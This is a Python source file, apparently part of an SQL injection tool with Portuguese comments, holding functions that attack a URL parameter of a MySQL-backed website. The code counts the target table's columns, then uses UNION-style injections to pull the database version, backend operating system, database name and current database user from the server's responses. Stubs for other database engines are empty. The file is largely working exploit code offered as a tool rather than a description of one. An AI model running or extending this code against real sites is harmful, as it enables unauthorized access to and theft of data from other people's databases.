# !/usr/bin/env python3

'''
faz um fingerprint no servido, retornando o nome do banco de dados e as suas tabelas
'''

from bs4 import BeautifulSoup
import requests
import re
import json
from sqlalchemy import column


from core.config import FIND_NUMBER_OF_COLLUM_IN_TABLE
from core.config import INITIAL_COUNT_VALUE
from core.config import VULNERABLE_COLLUM_DETECTING
from core.config import CHECKING_FOR_DBMS_VERSION
from core.config import GET_TABLES_NAMES
from core.config import MYSQL_SERVER_VERSIONS
from core.config import DATABASE_NAME
from core.config import GET_CURRENT_USER


from core.config import OS
from core import colors as color
from core.utils import  urlExplode


'''
mysql db fingerprint
'''
def _dbFingerprint(target):
    current_table_cullum_number = 0;
    
    url_exploded = urlExplode(target)
    para = re.compile('(=)\w+')
    if para.search(target):
        splited_para = para.search(target).group()
        for current_table_cullum_number_counter in range(1, 100):
            exploited_target_url = target.replace(splited_para, splited_para+FIND_NUMBER_OF_COLLUM_IN_TABLE+str(current_table_cullum_number_counter))
            main_request = requests.get(url=exploited_target_url)
            if 'mysql' in main_request.text.lower():
                current_table_cullum_number = current_table_cullum_number_counter - 1
                break
    return  current_table_cullum_number

## get sb server version....
def _serverVersion(target, cullumns_number):
    url_exploded = urlExplode(target)
    para = re.compile('(=)\w+')
    version = re.compile('^(\d+\.)?(\d+\.)?(\*|\d+)$')
    exploited_target_url = str()
    collumns_number_list = []
    columns = str()
    index_server_fingerprint_info = 1
    server_version = str()
    server_system = str()
    
    server_fingerprint_info = {}
    if para.search(target):
        splited_para = para.search(target).group()
        for collumns_perc in range(1, cullumns_number+1): ## apenas preenche umma lista contendo as colunas
            collumns_number_list.append(collumns_perc)
        ## transforma a lista em string eliminando os parentes reto
        columns = str(collumns_number_list)
        columns = columns.replace("[", "")
        columns = columns.replace("]", "")
        ## pega a versão do SGBD
        for collumns_perc in  range(1, cullumns_number+1):
            exploited_target_url = target.replace(splited_para, splited_para+VULNERABLE_COLLUM_DETECTING+columns.replace(str(collumns_perc), CHECKING_FOR_DBMS_VERSION))
            main_request = requests.get(url=exploited_target_url)
            for mysql_server_version in MYSQL_SERVER_VERSIONS:
                if mysql_server_version in main_request.text.lower():
                    server_version = mysql_server_version
                    server_fingerprint_info[1] = server_version
                    break
            ## pega o sistema backend do SGBD
            for dbms_backend_system in OS:
                if dbms_backend_system in main_request.text.lower():
                    server_system = dbms_backend_system
                    server_fingerprint_info[2] = server_system
                    break
    return server_fingerprint_info

def _getDatabaseNameU(target, cullumns_number):
    url_exploded = urlExplode(target)
    para = re.compile('(=)\w+')
    version = re.compile('^(\d+\.)?(\d+\.)?(\*|\d+)$')
    exploited_target_url = str()
    collumns_number_list = []
    columns = str()
    database_user_fingerprint = {}
    if para.search(target):
        splited_para = para.search(target).group() 
        for collumns_perc in range(1, cullumns_number+1): ## apenas preenche umma lista contendo as colunas
            collumns_number_list.append(collumns_perc)
        ## transforma a lista em string eliminando os parentes reto
        columns = str(collumns_number_list)
        columns = columns.replace("[", "")
        columns = columns.replace("]", "")
        
        ## pega o nome so banco de dados actual
        
        for collumns_perc in  range(1, cullumns_number+1):
            exploited_target_url = target.replace(splited_para, '=0'+VULNERABLE_COLLUM_DETECTING+columns.replace(str(collumns_perc), DATABASE_NAME))
            
            main_request = requests.get(url=exploited_target_url)
            main_request_parsed = BeautifulSoup(main_request.content, "html.parser")
            paragraph = main_request_parsed.find('div')
            tag_link  = paragraph.find_all('a')
            
            if not 'mysql' in paragraph.text.lower():
                paragraph = paragraph.find('p')
                for tag_link_perc in tag_link:
                    database_user_fingerprint[1] = paragraph.get_text()
                break
            
        ## pegando o usuário actual do banco de dados
        
        for collumns_perc in  range(1, cullumns_number+1):
            exploited_target_url = target.replace(splited_para, '=0'+VULNERABLE_COLLUM_DETECTING+columns.replace(str(collumns_perc), GET_CURRENT_USER))
            
            main_request = requests.get(url=exploited_target_url)
            main_request_parsed = BeautifulSoup(main_request.content, 'html.parser')
            div = main_request_parsed.find('div')
            
            if 'localhost' in div.text.lower():
                paragraph = div.find('p')
                tag_link = paragraph.find_all('a')
                for tag_link_perc in tag_link:
                    if '@localhost' in paragraph.text.lower():
                        database_user_fingerprint[2] = paragraph.get_text()
                break
        
    return database_user_fingerprint ## retorna um array contendo o nome do banco de dados e o usário actual
        
                
            
'''
mssql db fingerprint
'''

'''
postgres db fingerprint
'''

'''
oracle db fingerprint
'''